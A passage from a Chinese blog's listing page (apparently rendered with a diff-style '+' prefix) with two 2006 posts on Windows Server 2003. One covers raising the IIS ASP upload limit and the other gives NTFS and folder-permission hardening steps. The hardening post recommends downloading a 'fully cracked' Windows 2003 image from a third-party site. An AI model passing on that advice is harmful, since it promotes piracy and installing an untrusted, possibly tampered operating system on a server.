+二、解决windows2003最大只能上载200K的限制。 先在服务里关闭iis admin service服务，找到windows\system32\inesrv\下的metabase.xml,打开，找到ASPMaxRequestEntityAllowed 把他修改为需要的值，然后重启iis admin service服务 1、在web服务扩展 允许 active server pages和在服务器端的包含文件 2、修改各站点的属性 主目录－配置－选项－启用父路径 3、使之可以上传大于 200k的文件(修改成您要的大小就可以了，如在后面补两个0，就允许20m了) c:\WINDOWS\system32\inetsrv\MetaBase....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:08:38 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to Windows2003下Asp配置技巧" href="http://example.org/2006/02/25/windows2003e4b88baspe9858de7bdaee68a80e5b7a7/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>Windows Server 2003 安全配置
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>windows server2003是目前最为成熟的网络服务器平台，安全性相对于windows 2000有大大的提高,但是2003默认的安全配置不一定适合我们的需要，所以，我们要根据实际情况来对win2003进行全面安全配置。说实话，安全配置是一项比较有难度的网络技术，权限配置的太严格，好多程序又运行不起，权限配置的太松，又很容易被黑客入侵，做为网络管理员，真的很头痛，因此，我结合这几年的网络安全管理经验，总结出以下一些方法来提高我们服务器的安全性。 第一招：正确划分文件系统格式，选择稳定的操作系统安装盘 为了提高安全性，服务器的文件系统格式一定要划分成NTFS（新技术文件系统）格式，它比FAT16、FAT32的安全性、空间利用率都大大的提高，我们可以通过它来配置文件的安全性，磁盘配额、EPS文件加密等。如果你已经分成FAT32的格式了，可以用CONVERT 盘符 /FS：NTFS /V 来把FAT32转换成NTFS格式。正确安装windows 2003 server,在网安联盟http://cqhk.14023.com/Soft/yyrj/bigsoft/200504/502.asp&gt;有windows 2003的企业可升级版，这个一个完全破解了的版本，可以直接网上升级,我们安装时尽量只安装我们必须要用的组件，安装完后打上最新的补丁，到网上升级到最新版本！保证操作系统本身无漏洞。 第二招：正确设置磁盘的安全性,具体如下(虚拟机的安全设置，我们以asp程序为例子)重点：
+1、系统盘权限设置 C:分区部分： c:\ administrators 全部(该文件夹，子文件夹及文件) CREATOR OWNER 全部(只有子文件来及文件) system 全部(该文件夹，子文件夹及文件) IIS_WPG 创建文件/写入数据(只有该文件夹) IIS_WPG(该文件夹，子文件夹及文件) 遍历文件夹/运行文件 列出文件夹/读取数据 读取属性 创建文件夹/附加数据 读取权限 c:\Documents and Settings administrators 全部(该文件夹，子文件夹及文件) Power Users (该文件夹，子文件夹及文件) 读取和运行 列出文件夹目录 读取 SYSTEM全部(该文件夹，子文件夹及文件) C:\Program Files administrators 全部(该文件夹，子文件夹及文件) CREATOR OWNER全部(只有子文件来及文件) IIS_WPG (该文件夹，子文件夹及文件) 读取和运行 列出文件夹目录 读取 Power Users(该文件夹，子文件夹及文件) 修改权限 SYSTEM全部(该文件夹，子文件夹及文件) TERMINAL SERVER USER (该文件夹，子文件夹及文件) 修改权限 2、网站及虚拟机权限设置(比如网站在E盘) 说明：我们假设网站全部在E盘wwwsite目录下，并且为每一个虚拟机创建了一个guest用户，用户名为vhost1…vhostn并且创建了一个webuser组，把所有的vhost用户全部加入这个webuser组里面方便管理 E:\ Administrators全部(该文件夹，子文件夹及文件) E:\wwwsite Administrators全部(该文件夹，子文件夹及文件) system全部(该文件夹，子文件夹及文件) service全部(该文件夹，子文件夹及文件) E:\wwwsite\vhost1 Administrators全部(该文件夹，子文件夹及文件) system全部(该文件夹，子文件夹及文件) vhost1全部(该文件夹，子文件夹及文件) 3、数据备份盘 数据备份盘最好只指定一个特定的用户对它有完全操作的权限 比如F盘为数据备份盘，我们只指定一个管理员对它有完全操作的权限 4、其它地方的权限设置 请找到c盘的这些文件，把安全性设置只有特定的管理员有完全操作权限 下列这些文件只允许administrators访问 net....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:07:40 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to Windows Server 2003 安全配置" href="http://example.org/2006/02/25/windows-server-2003-e5ae89e585a8e9858de7bdae/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="http://example.org/page/34/">
+      «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="http://example.org/page/36/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="http://example.org/">白天’s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
